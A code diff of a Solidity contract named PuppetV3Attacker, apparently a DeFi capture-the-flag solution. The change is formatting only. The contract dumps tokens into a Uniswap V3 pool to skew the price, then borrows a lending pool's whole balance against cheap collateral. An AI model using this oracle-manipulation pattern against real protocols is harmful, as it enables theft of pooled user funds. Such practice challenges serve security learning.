@@ -23,8 +23,18 @@ contract PuppetV3Attacker {
     }
 
     function sellTokens() public {
-        token.transferFrom(player, address(this), token.balanceOf(player));
-        token.approve(address(UNISWAP_ROUTER), token.balanceOf(address(this)));
+
+        token.transferFrom(
+            player, 
+            address(this), 
+            token.balanceOf(player)
+        );
+
+        token.approve(
+            address(UNISWAP_ROUTER), 
+            token.balanceOf(address(this))
+        );
+
         ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
             tokenIn: address(token),
             tokenOut: address(weth),
@@ -35,12 +45,27 @@ contract PuppetV3Attacker {
             amountOutMinimum: 0,
             sqrtPriceLimitX96: 0
         });
+
         UNISWAP_ROUTER.exactInputSingle(params);
+        
     }
 
     function borrowTokens() public payable {
-        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
-        lendingPool.borrow(token.balanceOf(address(lendingPool)));
-        token.transfer(player, token.balanceOf(address(this)));
+
+        weth.approve(
+            address(lendingPool), 
+            weth.balanceOf(address(this))
+        );
+
+        lendingPool.borrow(token.balanceOf(
+            address(lendingPool)
+        ));
+
+        token.transfer(
+            player, 
+            token.balanceOf(address(this))
+        );
+
     }
+
 }
